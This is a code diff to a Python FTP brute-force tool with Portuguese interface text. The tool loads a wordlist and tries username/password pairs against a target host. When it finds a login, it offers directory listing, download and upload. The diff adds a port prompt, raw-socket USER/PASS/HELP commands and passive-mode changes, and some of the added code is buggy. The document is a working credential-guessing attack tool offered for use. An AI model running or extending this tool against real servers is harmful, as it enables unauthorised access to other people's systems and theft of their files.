@@ -1,8 +1,11 @@
 import os
 import sys
+import socket
 import ftplib
 import random
 from time import sleep
+
+MYSOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 if sys.platform == "linux":
 
@@ -33,7 +36,8 @@ def Comandos():
 \033[1mComando [\033[m \033[1;32mLS\033[m \033[1m] - Para listar o diretório\033[m
 \033[1mComando [\033[m \033[1;32mCD\033[m \033[1m] - Para entrar dentro de um diretório\033[m
 \033[1mComando [\033[m \033[1;32mCL\033[m \033[1m] - Para limpar a tela\033[m
-\033[1mComando [\033[m \033[1;32mPA\033[m \033[1m] - Para entrar no modo passivo\033[m
+\033[1mComando [\033[m \033[1;32mHP\033[m \033[1m] - Para visualizar os comandos do servidor\033[m
+\033[1mComando [\033[m \033[1;32mPA\033[m \033[1m] - Para entrar no modo passivo (pode ser desconectado)\033[m
 \033[1mComando [\033[m \033[1;32mCW\033[m \033[1m] - Para entrar direto no diretório\033[m
 \033[1mComando [\033[m \033[1;32mDW\033[m \033[1m] - Para fazer o download de um arquivo\033[m
 \033[1mComando [\033[m \033[1;32mUP\033[m \033[1m] - Para fazer o upload de um arquivo\033[m
@@ -65,7 +69,8 @@ Mesma coisa no Windows (aqui é avisado o motivo)
 banner()
 
 try:
-	host = str(input("\033[1;34m>>>\033[m ")).strip()
+	host = str(input("\033[1;34mHOST:\033[m ")).strip()
+	port = str(input("\033[1;34mPORTA\033[m \033[1m(default 21): \033[m"))
 except KeyboardInterrupt:
 	raise SystemExit
 except AttributeError:
@@ -95,7 +100,6 @@ with open("wordlist.txt","r") as arqpass:
 	arqpass.close()
 print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Wordlist carregada!\033[m")
 print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Iniciando o brute force...\033[m\n")
-sleep(1)
 try:
 	ftp = ftplib.FTP(host=host)
 except ftplib.socket.gaierror:
@@ -115,7 +119,7 @@ except BrokenPipeError:
 #tentando logar:
 print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m ======================\033[m\033[1;34m TENTANDO FAZER LOGIN\033[m \033[1m======================\033[m \033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m\n\n")
 for k,v in senhas.items():
-	sleep(1)
+	sleep(0.8)
 	try:
 		print("\033[1m[\033[m\033[1;36mLOGIN\033[m\033[1m]\033[m\033[1m Tentando com o user:\033[m \033[1;33m{}\033[m\033[1m e a senha:\033[m \033[1;33m{}\033[m".format(k,v))
 		server = ftp.login(user=k,passwd=v)
@@ -139,10 +143,10 @@ for k,v in senhas.items():
 			logou = True
 			userlogin = k
 			userpassw = v
-			print("\n\033[1m[\033[m\033[1;32m >> LOGIN ENCONTRADO: <<\033[m\033[1m]\033[m\n")
+			print("\n\033[1m[\033[m\033[1;32m >> LOGIN ENCONTRADO: <<\033[m\033[1m ]\033[m\n")
 			print("\033[1m[\033[m\033[1;32mACCEPT\033[m\033[1m]\033[m\033[1m User: {}\033[m".format(k))
 			print("\033[1m[\033[m\033[1;32mACCEPT\033[m\033[1m]\033[m\033[1m Pass: {}\033[m".format(v))
-			sleep(2)
+			sleep(1)
 			ftp.quit()
 			break
 		else:
@@ -169,12 +173,65 @@ if logou:
 					try:
 						entrar.cwd(directory.lower())
 					except ftplib.error_perm:
-						entrar.cwd(directory.capitalize())
+						try:
+							entrar.cwd(directory.capitalize())
+						except:
+							print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Permissão negada!\033[m")
+			elif comando_user == "hp":
+				print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Todos esses comandos foram para o meu painel de help,\033[m \033[1;32mDIGITE C\033[m \033[1mpara ver!\033[m\n\n")
+				usernames = userlogin.encode()
+				passwords = userpassw.encode()
+				try:
+					MYSOCKET.connect((host,port))
+				except:
+					MYSOCKET.connect((host,21))
+				baner_pass = MYSOCKET.recv(1024)
+				if userlogin == "" or userpassw == "":
+					MYSOCKET.send(b"USER anonymous\r\n")
+					userrecv = MYSOCKET.recv(1048)
+					MYSOCKET.send(b"PASS passwd\r\n")
+					paswrecv = MYSOCKET.recv(1048) 
+					MYSOCKET.send(b"HELP \r\n")
+					ignore = MYSOCKET.recv(2048)
+					MYSOCKET.send(b"HELP \r\n")
+					accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
+					print(accept)
+				else:
+					MYSOCKET.send(b"USER "+usernames+b"\r\n")
+					userrecv = MYSOCKET.recv(1048)
+					MYSOCKET.send(b"PASS "+passwords+b"\r\n")
+					paswrecv = MYSOCKET.recv(1048) 
+					MYSOCKET.send(b"HELP \r\n")
+					ignore = MYSOCKET.recv(2048)
+					MYSOCKET.send(b"HELP \r\n")
+					accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
+					print(accept)
 			elif comando_user == "ls":
 				entrar.dir()
 			elif comando_user == "pa":
-				print("\033[1m[\033[m\033[1;36m+\033[m\033[1m]\033[m\033[1m Modo passivo ativado!\033[m")
-				entrar.set_pasv(True)
+				try:
+					MYSOCKET.connect((host,port))
+				except:
+					MYSOCKET.connect((host,21))
+				baner_pass = MYSOCKET.recv(1024)
+				if userlogin == "" or userpassw == "":
+					MYSOCKET.send(b"USER anonymous\r\n")
+					userrecv = MYSOCKET.recv(1048)
+					MYSOCKET.send(b"PASS passwd\r\n")
+					paswrecv = MYSOCKET.recv(1048) 
+					MYSOCKET.send(b"PASV 10\r\n")
+					accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
+					print(accept)
+				else:
+					MYSOCKET.send(b"USER "+usernames+b"\r\n")
+					userrecv = MYSOCKET.recv(1048)
+					MYSOCKET.send(b"PASS "+passwords+b"\r\n")
+					paswrecv = MYSOCKET.recv(1048) 
+					MYSOCKET.send(b"HELP \r\n")
+					ignore = MYSOCKET.recv(2048)
+					MYSOCKET.send(b"HELP \r\n")
+					accept = MYSOCKET.recv(2048).decode("utf-8").replace("214 Help OK.","")
+					print(accept)
 			elif comando_user == "cl":
 				if sys.platform == "win32":
 					os.system("cls")
@@ -261,5 +318,8 @@ if logou:
 			raise SystemExit
 		except KeyboardInterrupt:
 			raise SystemExit
-else:
-	print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Nenhuma senha encontrada para esse servidor...\n")
+		except OSError:
+			print("\033[1m[\033[m\033[1;31mCLOSE\033[m\033[1m]\033[m\033[1m Você foi desconectado do servidor, relogue!\033[m\n")
+			raise SystemExit
+	else:
+		print("\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m\033[1m Nenhuma senha encontrada para esse servidor...\n")
